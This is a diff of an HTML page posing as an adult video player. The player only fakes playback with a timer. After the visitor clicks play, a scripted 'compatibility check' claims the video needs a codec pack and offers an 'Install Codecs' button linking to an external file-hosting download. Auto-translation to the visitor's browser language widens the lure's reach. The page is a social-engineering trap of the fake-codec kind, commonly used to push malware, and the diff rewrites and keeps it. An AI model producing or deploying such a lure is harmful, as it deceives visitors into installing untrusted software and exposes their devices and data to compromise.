@@ -4,377 +4,423 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XVideo Player</title>
+
+<title>Video Player</title>
 
 <style>
-/* GOOGLE TRANSLATE */
-.goog-te-banner-frame.skiptranslate,
-.goog-te-gadget-icon,
-#goog-gt-tt,
-.goog-te-balloon-frame,
-.goog-te-menu-frame {
-    display:none !important;
-}
-
-body > .skiptranslate {
-    display:none !important;
-}
-
-body {
-    margin:0;
-    background:#000;
-    min-height:100vh;
-    font-family:Arial,sans-serif;
-    color:#fff;
-    overflow-x:hidden;
-
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    justify-content:center;
-
-    padding:20px 0;
+*{
     box-sizing:border-box;
 }
 
-.player-wrapper {
-    width:90vw;
-    max-width:900px;
+html,
+body{
+    margin:0;
+    padding:0;
+    width:100%;
+    min-height:100%;
 }
 
-.player {
+body{
+    background:#111;
+    color:#fff;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+/* Google Translate */
+.goog-te-banner-frame.skiptranslate{
+    display:none !important;
+}
+
+body{
+    top:0 !important;
+}
+
+.goog-te-gadget{
+    font-size:0 !important;
+}
+
+#google_translate_element{
+    position:fixed;
+    left:-10000px;
+    top:-10000px;
+    width:1px;
+    height:1px;
+    overflow:hidden;
+    opacity:0;
+    pointer-events:none;
+}
+
+/* Main */
+.wrapper{
+    width:100%;
+    max-width:1000px;
+    margin:0 auto;
+    padding:20px 12px 40px;
+}
+
+.player{
     position:relative;
     width:100%;
-    aspect-ratio:16/9;
-
-    background:#000 url("ai_bot.png") center/cover no-repeat;
-
+    aspect-ratio:16 / 9;
+    background:#000 url("ai_bot.png") center center / cover no-repeat;
+    border-radius:10px;
     overflow:hidden;
-    border-radius:12px;
-    cursor:pointer;
-
-    box-shadow:0 12px 40px rgba(0,0,0,.5);
+    box-shadow:0 10px 35px rgba(0,0,0,.45);
 }
 
-.controls {
+/* Bottom protection gradient */
+.player::after{
+    content:"";
     position:absolute;
-    bottom:0;
     left:0;
     right:0;
+    bottom:0;
+    height:85px;
+    background:linear-gradient(
+        to bottom,
+        rgba(0,0,0,0),
+        rgba(0,0,0,.15),
+        rgba(0,0,0,.72)
+    );
+    pointer-events:none;
+    z-index:1;
+}
 
-    background:rgba(0,0,0,.74);
+/* Center play button */
+.center-play{
+    position:absolute;
+    left:50%;
+    top:50%;
+    transform:translate(-50%,-50%);
+    width:72px;
+    height:72px;
+    border-radius:50%;
+    border:0;
+    background:rgba(0,0,0,.65);
+    color:#fff;
+    font-size:30px;
+    cursor:pointer;
+    z-index:3;
+    transition:.2s ease;
+}
 
+.center-play:hover{
+    transform:translate(-50%,-50%) scale(1.08);
+    background:rgba(0,0,0,.82);
+}
+
+/* Controls */
+.controls{
+    position:absolute;
+    left:0;
+    right:0;
+    bottom:0;
+    height:52px;
     display:flex;
     align-items:center;
-
-    padding:8px;
     gap:10px;
-
-    font-size:14px;
+    padding:7px 10px;
+    background:linear-gradient(
+        to top,
+        rgba(0,0,0,.92),
+        rgba(0,0,0,.68)
+    );
+    z-index:2;
 }
 
-.btn {
+.control-btn{
+    border:0;
+    background:none;
+    color:#fff;
     cursor:pointer;
-    display:flex;
-    align-items:center;
-    user-select:none;
-    font-size:16px;
-
-    transition:opacity .2s,transform .2s;
-}
-
-.btn:hover {
-    opacity:.75;
-}
-
-.btn:active {
-    transform:scale(.9);
-}
-
-.volume {
-    display:flex;
-    align-items:center;
-    gap:4px;
-    min-width:60px;
-}
-
-.volume input[type="range"] {
-    width:80px;
-    cursor:pointer;
-}
-
-.progress-container {
-    flex:1;
-    display:flex;
-    align-items:center;
-    gap:8px;
-    min-width:80px;
-}
-
-.progress-bar {
-    flex:1;
-    height:4px;
-    background:#333;
-    border-radius:2px;
-    position:relative;
-    cursor:pointer;
-}
-
-.progress {
-    width:0%;
-    height:100%;
-    background:#e65c2d;
-    border-radius:2px;
-}
-
-.time {
-    white-space:nowrap;
-    font-size:13px;
-}
-
-.right-controls {
-    display:flex;
-    gap:12px;
-    align-items:center;
-}
-
-
-/* ==================================================
-   CODEC BOX
-================================================== */
-
-.codec-box {
-    margin-top:0;
-
-    padding:0 20px;
-
-    background:
-        linear-gradient(
-            135deg,
-            rgba(25,25,25,.97),
-            rgba(11,11,11,.97)
-        );
-
-    border:1px solid rgba(255,255,255,.08);
-    border-radius:12px;
-
-    text-align:center;
-
-    box-shadow:0 8px 30px rgba(0,0,0,.35);
-
-    opacity:0;
-    transform:translateY(10px);
-
-    max-height:0;
-    overflow:hidden;
-
-    transition:
-        opacity .4s ease,
-        transform .4s ease,
-        max-height .5s ease,
-        margin-top .4s ease,
-        padding .4s ease;
-}
-
-.codec-box.visible {
-    opacity:1;
-    transform:translateY(0);
-
-    max-height:220px;
-
-    margin-top:18px;
-
-    padding:18px 20px;
-}
-
-
-/* CHECKING */
-
-.checking {
+    font-size:18px;
+    width:32px;
+    min-width:32px;
+    height:32px;
+    padding:0;
     display:flex;
     align-items:center;
     justify-content:center;
-
-    gap:10px;
-
-    color:#aaa;
-
-    font-size:13px;
-
-    min-height:24px;
 }
 
-.loader {
-    width:14px;
-    height:14px;
+.control-btn:hover{
+    color:#ddd;
+}
 
-    border:2px solid rgba(255,255,255,.18);
-    border-top-color:#e65c2d;
+.progress-wrap{
+    flex:1;
+    height:5px;
+    background:rgba(255,255,255,.25);
+    border-radius:10px;
+    cursor:pointer;
+    overflow:hidden;
+}
 
+.progress{
+    width:0%;
+    height:100%;
+    background:#fff;
+    border-radius:10px;
+}
+
+.time{
+    font-size:12px;
+    color:#fff;
+    white-space:nowrap;
+    min-width:76px;
+    text-align:right;
+}
+
+.volume{
+    width:62px;
+    min-width:62px;
+    accent-color:#fff;
+}
+
+/* Codec box */
+.codec-box{
+    margin-top:18px;
+    padding:20px;
+    border-radius:10px;
+    background:#1a1a1a;
+    border:1px solid #292929;
+    text-align:center;
+    display:none;
+    box-shadow:0 8px 25px rgba(0,0,0,.25);
+}
+
+.codec-box.visible{
+    display:block;
+    animation:fadeIn .45s ease;
+}
+
+.checking{
+    color:#ddd;
+    font-size:15px;
+}
+
+.spinner{
+    width:28px;
+    height:28px;
+    margin:0 auto 12px;
+    border:3px solid rgba(255,255,255,.18);
+    border-top-color:#fff;
     border-radius:50%;
-
     animation:spin .8s linear infinite;
 }
 
-@keyframes spin {
-    to {
+.codec-result{
+    display:none;
+}
+
+.codec-result.show{
+    display:block;
+    animation:fadeIn .45s ease;
+}
+
+.codec-result h2{
+    margin:0 0 10px;
+    font-size:20px;
+    color:#fff;
+}
+
+.codec-result p{
+    margin:0 auto 18px;
+    max-width:620px;
+    color:#bbb;
+    font-size:14px;
+    line-height:1.55;
+}
+
+.install-btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    min-height:44px;
+    padding:0 24px;
+    border-radius:7px;
+    background:#fff;
+    color:#111;
+    text-decoration:none;
+    font-weight:700;
+    font-size:14px;
+    transition:.2s ease;
+}
+
+.install-btn:hover{
+    transform:translateY(-1px);
+    background:#e8e8e8;
+}
+
+/* Animations */
+@keyframes spin{
+    from{
+        transform:rotate(0deg);
+    }
+    to{
         transform:rotate(360deg);
     }
 }
 
-
-/* RESULT */
-
-.codec-result {
-    display:none;
-}
-
-.codec-result.show {
-    display:block;
-
-    animation:resultIn .45s ease;
-}
-
-@keyframes resultIn {
-    from {
+@keyframes fadeIn{
+    from{
         opacity:0;
-        transform:translateY(6px);
+        transform:translateY(8px);
     }
-
-    to {
+    to{
         opacity:1;
         transform:translateY(0);
     }
 }
 
-.codec-title {
-    margin:0 0 7px;
+/* Tablet */
+@media(max-width:768px){
 
-    font-size:16px;
-    font-weight:600;
-
-    color:#fff;
-}
-
-.codec-text {
-    margin:0 0 15px;
-
-    font-size:13px;
-    line-height:1.5;
-
-    color:#aaa;
-}
-
-.codec-button {
-    display:inline-flex;
-
-    align-items:center;
-    justify-content:center;
-
-    gap:8px;
-
-    padding:11px 22px;
-
-    border-radius:8px;
-
-    background:
-        linear-gradient(
-            135deg,
-            #e65c2d,
-            #ff7a45
-        );
-
-    color:#fff;
-
-    text-decoration:none;
-
-    font-size:13px;
-    font-weight:600;
-
-    transition:
-        transform .2s ease,
-        box-shadow .2s ease;
-
-    box-shadow:
-        0 5px 18px rgba(230,92,45,.25);
-}
-
-.codec-button:hover {
-    transform:translateY(-2px);
-
-    box-shadow:
-        0 8px 24px rgba(230,92,45,.4);
-}
-
-.codec-button:active {
-    transform:translateY(0);
-}
-
-
-/* ==================================================
-   MOBILE
-================================================== */
-
-@media(max-width:768px) {
-
-    body {
-        padding:15px 0;
+    .wrapper{
+        padding:10px 8px 30px;
     }
 
-    .controls {
-        font-size:12px;
-        gap:6px;
-        padding:6px;
+    .player{
+        border-radius:8px;
     }
 
-    .btn {
-        font-size:14px;
-    }
-
-    .time {
-        font-size:11px;
-    }
-
-    .volume input[type="range"] {
+    .center-play{
         width:60px;
+        height:60px;
+        font-size:25px;
     }
 
-    .codec-box.visible {
-        margin-top:14px;
-        padding:16px;
+    .controls{
+        height:38px;
+        padding:4px 7px;
+        gap:5px;
     }
 
-    .codec-title {
+    .control-btn{
+        width:27px;
+        min-width:27px;
+        height:27px;
         font-size:15px;
     }
 
-    .codec-text {
-        font-size:12px;
+    .progress-wrap{
+        height:4px;
+    }
+
+    .time{
+        font-size:10px;
+        min-width:68px;
+    }
+
+    .volume{
+        width:48px;
+        min-width:48px;
+    }
+
+    .player::after{
+        height:58px;
     }
 }
 
-@media(max-width:480px) {
+/* Mobile */
+@media(max-width:480px){
 
-    .controls {
-        font-size:11px;
-        gap:4px;
+    .wrapper{
+        padding:6px 5px 25px;
     }
 
-    .btn {
+    .player{
+        border-radius:7px;
+    }
+
+    .center-play{
+        width:52px;
+        height:52px;
+        font-size:22px;
+    }
+
+    .controls{
+        height:34px;
+        padding:3px 5px;
+        gap:3px;
+    }
+
+    .control-btn{
+        width:24px;
+        min-width:24px;
+        height:24px;
+        font-size:13px;
+    }
+
+    .progress-wrap{
+        height:3px;
+    }
+
+    .time{
+        font-size:9px;
+        min-width:60px;
+    }
+
+    .volume{
+        width:40px;
+        min-width:40px;
+    }
+
+    .player::after{
+        height:50px;
+    }
+
+    .codec-box{
+        margin-top:12px;
+        padding:16px 12px;
+    }
+
+    .codec-result h2{
+        font-size:18px;
+    }
+
+    .codec-result p{
+        font-size:13px;
+    }
+
+    .install-btn{
+        width:100%;
+        min-height:42px;
+    }
+}
+
+/* Very small phones */
+@media(max-width:360px){
+
+    .controls{
+        height:31px;
+        padding:2px 4px;
+        gap:2px;
+    }
+
+    .control-btn{
+        width:22px;
+        min-width:22px;
+        height:22px;
         font-size:12px;
     }
 
-    .time {
-        font-size:10px;
+    .progress-wrap{
+        height:3px;
     }
 
-    .volume input[type="range"] {
-        width:50px;
+    .time{
+        font-size:8px;
+        min-width:54px;
     }
 
-    .codec-button {
-        width:100%;
-        box-sizing:border-box;
+    .volume{
+        width:34px;
+        min-width:34px;
+    }
+
+    .player::after{
+        height:45px;
     }
 }
 </style>
@@ -382,140 +428,78 @@ body {
 
 <body>
 
-<!--
-    Google Translate container.
-    It is positioned outside the screen instead
-    of display:none, because Google Translate
-    may not initialize correctly when hidden.
--->
-<div
-    id="google_translate_element"
-    style="
-        position:absolute;
-        left:-9999px;
-        top:-9999px;
-        width:1px;
-        height:1px;
-        overflow:hidden;
-    ">
-</div>
+<!-- Google Translate -->
+<div id="google_translate_element"></div>
 
-
-<div class="player-wrapper">
-
-    <!-- PLAYER -->
+<div class="wrapper">
 
     <div class="player" id="player">
 
+        <button class="center-play" id="centerPlay" aria-label="Play">
+            ▶
+        </button>
+
         <div class="controls">
 
-            <div
-                class="btn"
-                id="play-btn"
-                title="Play">
-                ▶
+            <button
+                class="control-btn"
+                id="playBtn"
+                title="Play"
+                aria-label="Play"
+            >▶</button>
+
+            <div class="progress-wrap" id="progressWrap">
+                <div class="progress" id="progress"></div>
             </div>
 
-            <div class="volume">
-
-                <div
-                    class="btn"
-                    title="Volume">
-                    🔊
-                </div>
-
-                <input
-                    type="range"
-                    id="volume"
-                    min="0"
-                    max="100"
-                    value="50">
+            <div class="time" id="time">
+                00:00 / 15:28
             </div>
 
-            <div class="progress-container">
-
-                <div
-                    class="progress-bar"
-                    id="progress-bar">
-
-                    <div
-                        class="progress"
-                        id="progress">
-                    </div>
-
-                </div>
-
-                <div
-                    class="time"
-                    id="time">
-                    0:00 / 0:00
-                </div>
-
-            </div>
-
-            <div class="right-controls">
-
-                <div
-                    class="btn"
-                    title="Settings">
-                    ⚙
-                </div>
-
-                <div
-                    class="btn"
-                    id="fullscreen-btn"
-                    title="Fullscreen">
-                    ⛶
-                </div>
-
-            </div>
+            <input
+                class="volume"
+                id="volume"
+                type="range"
+                min="0"
+                max="1"
+                step="0.01"
+                value="1"
+                aria-label="Volume"
+            >
 
         </div>
     </div>
 
+    <!-- Compatibility check -->
+    <div class="codec-box" id="codecBox">
 
-    <!-- COMPATIBILITY BOX -->
+        <div class="checking" id="checking">
 
-    <div
-        class="codec-box"
-        id="codec-box">
+            <div class="spinner"></div>
 
-        <div
-            class="checking"
-            id="checking">
-
-            <span class="loader"></span>
-
-            <span>
+            <div>
                 Checking video compatibility...
-            </span>
+            </div>
 
         </div>
 
+        <div class="codec-result" id="codecResult">
 
-        <div
-            class="codec-result"
-            id="codec-result">
-
-            <div class="codec-title">
+            <h2>
                 Video compatibility issue
-            </div>
+            </h2>
 
-            <p class="codec-text">
-                This video requires additional codecs
-                for proper playback. You ned install the codec
-                pack.
+            <p>
+                This video requires additional codecs for proper playback. You ned install the codec pack.
             </p>
 
             <a
-                class="codec-button"
+                class="install-btn"
                 href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack"
                 target="_blank"
-                rel="noopener noreferrer">
-
-                <span>⬇</span>
+                rel="noopener noreferrer"
+            >
                 Install Codecs
-
             </a>
 
         </div>
@@ -524,110 +508,93 @@ body {
 
 </div>
 
-
 <script>
+/* ================================
+   Player
+================================ */
 
-/* ==================================================
-   PLAYER
-================================================== */
+const player = document.getElementById("player");
+const playBtn = document.getElementById("playBtn");
+const centerPlay = document.getElementById("centerPlay");
+const progressWrap = document.getElementById("progressWrap");
+const progress = document.getElementById("progress");
+const time = document.getElementById("time");
+const volume = document.getElementById("volume");
 
-const playBtn =
-    document.getElementById("play-btn");
-
-const player =
-    document.getElementById("player");
-
-const volumeSlider =
-    document.getElementById("volume");
-
-const progress =
-    document.getElementById("progress");
-
-const progressBar =
-    document.getElementById("progress-bar");
-
-const timeDisplay =
-    document.getElementById("time");
-
-const codecBox =
-    document.getElementById("codec-box");
-
-const checking =
-    document.getElementById("checking");
-
-const codecResult =
-    document.getElementById("codec-result");
-
+const codecBox = document.getElementById("codecBox");
+const checking = document.getElementById("checking");
+const codecResult = document.getElementById("codecResult");
 
 let isPlaying = false;
-
 let interval = null;
 
 let currentTime = 0;
 
 let compatibilityTimer = null;
-
 let resultTimer = null;
 
-
-/* Random duration 12:02 - 15:28 */
-
+/*
+   Random duration:
+   12:02 - 15:28
+*/
 const totalDuration =
     Math.floor(
         Math.random() * (928 - 722 + 1)
     ) + 722;
 
 
-/* ==================================================
-   TIME
-================================================== */
+/* Format seconds */
+function formatTime(seconds){
 
-function formatTime(sec) {
+    const minutes = Math.floor(seconds / 60);
 
-    const m =
-        Math.floor(sec / 60);
+    const secs = seconds % 60;
 
-    const s =
-        sec % 60;
-
-    return (
-        m + ":" +
-        s.toString().padStart(2,"0")
-    );
+    return String(minutes).padStart(2,"0")
+        + ":"
+        + String(secs).padStart(2,"0");
 }
 
 
-function updateTime() {
+/* Update player time */
+function updateTime(){
 
-    timeDisplay.textContent =
-        formatTime(currentTime) +
-        " / " +
-        formatTime(totalDuration);
+    const percent =
+        (currentTime / totalDuration) * 100;
 
     progress.style.width =
-        (currentTime / totalDuration * 100) +
-        "%";
+        Math.min(percent,100) + "%";
+
+    time.textContent =
+        formatTime(currentTime)
+        + " / "
+        + formatTime(totalDuration);
 }
 
 
-/* ==================================================
-   PLAY
-================================================== */
+/* Start fake playback */
+function startProgress(){
 
-function startProgress() {
-
-    if (interval !== null)
+    if(interval !== null){
         return;
+    }
 
-    interval = setInterval(() => {
+    isPlaying = true;
 
-        if (currentTime < totalDuration) {
+    playBtn.textContent = "❚❚";
+    playBtn.title = "Pause";
+
+    centerPlay.style.display = "none";
+
+    interval = setInterval(function(){
+
+        if(currentTime < totalDuration){
 
             currentTime++;
 
             updateTime();
 
-        } else {
+        }else{
 
             stopProgress();
 
@@ -637,13 +604,10 @@ function startProgress() {
 }
 
 
-/* ==================================================
-   STOP
-================================================== */
+/* Stop fake playback */
+function stopProgress(){
 
-function stopProgress() {
-
-    if (interval !== null) {
+    if(interval !== null){
 
         clearInterval(interval);
 
@@ -653,354 +617,327 @@ function stopProgress() {
     isPlaying = false;
 
     playBtn.textContent = "▶";
-
     playBtn.title = "Play";
+
+    centerPlay.style.display = "flex";
 }
 
 
-/* ==================================================
-   COMPATIBILITY
-================================================== */
+/* Compatibility animation */
+function showCompatibilityCheck(){
 
-function showCompatibilityCheck() {
-
-    if (compatibilityTimer !== null)
+    if(compatibilityTimer !== null){
         return;
+    }
 
+    compatibilityTimer = setTimeout(function(){
 
-    /*
-       Wait 2 seconds after click.
-    */
+        codecBox.classList.add("visible");
 
-    compatibilityTimer =
-        setTimeout(() => {
+        /*
+           Wait before showing result
+        */
+        resultTimer = setTimeout(function(){
 
-            codecBox.classList.add(
-                "visible"
-            );
+            checking.style.display = "none";
 
+            codecResult.classList.add("show");
 
-            /*
-               Show checking for 3 seconds.
-            */
+            translateNewContent();
 
-            resultTimer =
-                setTimeout(() => {
+        },3000);
 
-                    checking.style.display =
-                        "none";
-
-                    codecResult.classList.add(
-                        "show"
-                    );
-
-
-                    /*
-                       Notify Google Translate
-                       that new text appeared.
-                    */
-
-                    translateNewContent();
-
-                },3000);
-
-        },2000);
+    },2000);
 }
 
 
-/* ==================================================
-   PLAY BUTTON
-================================================== */
+/* Play button */
+playBtn.addEventListener("click",function(e){
 
-playBtn.addEventListener(
-    "click",
-    e => {
+    e.stopPropagation();
 
-        e.stopPropagation();
+    if(isPlaying){
 
-        if (isPlaying) {
+        stopProgress();
 
-            stopProgress();
+    }else{
 
-        } else {
+        startProgress();
 
-            startProgress();
-
-            isPlaying = true;
-
-            playBtn.textContent = "⏸";
-
-            playBtn.title = "Stop";
-
-            showCompatibilityCheck();
-        }
+        showCompatibilityCheck();
 
     }
-);
+
+});
 
 
-/* ==================================================
-   PLAYER CLICK
-================================================== */
+/* Center play */
+centerPlay.addEventListener("click",function(e){
 
-player.addEventListener(
-    "click",
-    e => {
+    e.stopPropagation();
 
-        if (
-            e.target.closest(".controls")
-        ) {
-            return;
-        }
+    startProgress();
 
-        if (!isPlaying) {
+    showCompatibilityCheck();
 
-            startProgress();
+});
 
-            isPlaying = true;
 
-            playBtn.textContent = "⏸";
+/* Click player */
+player.addEventListener("click",function(e){
 
-            playBtn.title = "Stop";
+    if(e.target.closest(".controls")){
+        return;
+    }
 
-            showCompatibilityCheck();
-        }
+    if(!isPlaying){
+
+        startProgress();
+
+        showCompatibilityCheck();
 
     }
-);
+
+});
 
 
-/* ==================================================
-   VOLUME
-================================================== */
+/* Progress seeking */
+progressWrap.addEventListener("click",function(e){
 
-volumeSlider.addEventListener(
-    "input",
-    () => {
+    const rect =
+        progressWrap.getBoundingClientRect();
 
-        console.log(
-            "Volume:",
-            volumeSlider.value
+    const percent =
+        (e.clientX - rect.left) / rect.width;
+
+    currentTime =
+        Math.floor(
+            totalDuration *
+            Math.max(0,Math.min(1,percent))
         );
 
-    }
-);
+    updateTime();
+
+});
 
 
-/* ==================================================
-   SEEK
-================================================== */
+/* Volume */
+volume.addEventListener("input",function(){
 
-progressBar.addEventListener(
-    "click",
-    e => {
+    /*
+       Kept for UI compatibility.
+       There is no actual media element in this demo.
+    */
 
-        e.stopPropagation();
-
-        const rect =
-            progressBar.getBoundingClientRect();
-
-        const x =
-            e.clientX - rect.left;
-
-        currentTime =
-            Math.floor(
-                x / rect.width *
-                totalDuration
-            );
-
-        updateTime();
-
-    }
-);
+});
 
 
+/* Initial time */
 updateTime();
 
 
-/* ==================================================
-   GOOGLE TRANSLATE
-================================================== */
+/* ================================
+   Google Translate
+================================ */
 
-let browserLang = "en";
+function googleTranslateElementInit(){
 
+    new google.translate.TranslateElement({
 
-function googleTranslateElementInit() {
+        pageLanguage:"en",
 
-    new google.translate.TranslateElement(
-        {
-            pageLanguage:"en",
+        autoDisplay:false,
 
-            autoDisplay:false,
+        includedLanguages:
+            "en,uk,ru,de,fr,es,it,pt,pl,tr,ro,cs,sk,hu,nl,sv,no,da,fi,el,bg,ar,he,hi,ja,ko,zh-CN,zh-TW",
 
-            includedLanguages:
-                "en,uk,ru,de,fr,es,it,pt,pl,tr,ro,cs,sk,hu,nl,sv,no,da,fi,el,bg,ar,he,hi,ja,ko,zh-CN,zh-TW",
+        layout:
+            google.translate.TranslateElement.InlineLayout.SIMPLE
 
-            layout:
-                google.translate.TranslateElement.InlineLayout.SIMPLE
+    },"google_translate_element");
 
-        },
-
-        "google_translate_element"
-    );
+}
 
 
-    /*
-       Browser language
-    */
+/* Browser language */
+function getBrowserLanguage(){
 
-    browserLang =
+    const lang =
         (
             navigator.language ||
             navigator.userLanguage ||
             "en"
-        )
-        .toLowerCase()
-        .split("-")[0];
+        ).toLowerCase();
 
+    return lang.split("-")[0];
 
-    /*
-       Wait until Google Translate
-       creates its language selector.
-    */
-
-    waitForTranslator();
 }
 
 
-/* ==================================================
-   WAIT FOR TRANSLATOR
-================================================== */
+/* Apply language */
+function applyBrowserLanguage(){
 
-function waitForTranslator() {
+    const browserLanguage =
+        getBrowserLanguage();
 
-    let attempts = 0;
+    const supported = [
 
-    const timer =
-        setInterval(() => {
+        "en",
+        "uk",
+        "ru",
+        "de",
+        "fr",
+        "es",
+        "it",
+        "pt",
+        "pl",
+        "tr",
+        "ro",
+        "cs",
+        "sk",
+        "hu",
+        "nl",
+        "sv",
+        "no",
+        "da",
+        "fi",
+        "el",
+        "bg",
+        "ar",
+        "he",
+        "hi",
+        "ja",
+        "ko"
 
-            const select =
-                document.querySelector(
-                    ".goog-te-combo"
-                );
+    ];
 
-            attempts++;
-
-
-            if (select) {
-
-                if (
-                    browserLang !== "en"
-                ) {
-
-                    select.value =
-                        browserLang;
-
-                    select.dispatchEvent(
-                        new Event("change")
-                    );
-                }
-
-                clearInterval(timer);
-
-                return;
-            }
-
-
-            if (attempts >= 40) {
-
-                clearInterval(timer);
-            }
-
-        },500);
-}
-
-
-/* ==================================================
-   TRANSLATE NEW CONTENT
-================================================== */
-
-function translateNewContent() {
-
-    if (browserLang === "en")
+    if(!supported.includes(browserLanguage)){
         return;
-
+    }
 
     const select =
-        document.querySelector(
-            ".goog-te-combo"
-        );
+        document.querySelector(".goog-te-combo");
 
-    if (!select)
+    if(!select){
         return;
+    }
 
+    if(select.value !== browserLanguage){
 
-    /*
-       Re-trigger translation.
-    */
-
-    select.value = "en";
-
-    select.dispatchEvent(
-        new Event("change")
-    );
-
-
-    setTimeout(() => {
-
-        select.value =
-            browserLang;
+        select.value = browserLanguage;
 
         select.dispatchEvent(
             new Event("change")
         );
 
-    },500);
+    }
+
 }
 
 
-/* ==================================================
-   OBSERVER
-================================================== */
+/* Dynamic translation */
+function translateNewContent(){
 
-const observer =
-    new MutationObserver(
-        mutations => {
+    setTimeout(function(){
 
-            let newText = false;
+        applyBrowserLanguage();
 
-            mutations.forEach(
-                mutation => {
+    },300);
 
-                    if (
-                        mutation.type ===
-                        "childList"
-                    ) {
-                        newText = true;
-                    }
+    setTimeout(function(){
 
-                }
-            );
+        applyBrowserLanguage();
+
+    },1000);
+
+    setTimeout(function(){
+
+        applyBrowserLanguage();
+
+    },2000);
+
+}
 
 
-            if (
-                newText &&
-                browserLang !== "en"
-            ) {
+/* Wait for Google Translate */
+function waitForTranslator(){
 
-                /*
-                   Give Google Translate
-                   a moment to process DOM.
-                */
+    let attempts = 0;
 
-                setTimeout(
-                    translateNewContent,
-                    300
-                );
+    const timer =
+        setInterval(function(){
+
+            attempts++;
+
+            const select =
+                document.querySelector(".goog-te-combo");
+
+            if(select){
+
+                clearInterval(timer);
+
+                applyBrowserLanguage();
+
+                return;
             }
 
+            if(attempts > 40){
+
+                clearInterval(timer);
+
+            }
+
+        },500);
+
+}
+
+
+/* Load Google Translate */
+(function(){
+
+    const script =
+        document.createElement("script");
+
+    script.src =
+        "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
+
+    script.async = true;
+
+    document.head.appendChild(script);
+
+})();
+
+
+/* Observer for dynamically added text */
+const observer =
+    new MutationObserver(function(mutations){
+
+        let changed = false;
+
+        mutations.forEach(function(mutation){
+
+            if(mutation.type === "childList"){
+
+                if(
+                    mutation.addedNodes &&
+                    mutation.addedNodes.length
+                ){
+
+                    changed = true;
+
+                }
+
+            }
+
+        });
+
+        if(changed){
+
+            translateNewContent();
+
         }
-    );
+
+    });
 
 
 observer.observe(
@@ -1011,13 +948,22 @@ observer.observe(
     }
 );
 
-</script>
+
+/* Start translator polling */
+setTimeout(function(){
+
+    waitForTranslator();
+
+},1000);
 
 
-<!-- GOOGLE TRANSLATE -->
+/* Additional retry */
+setTimeout(function(){
 
-<script
-src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
+    applyBrowserLanguage();
+
+},4000);
+
 </script>
 
 </body>
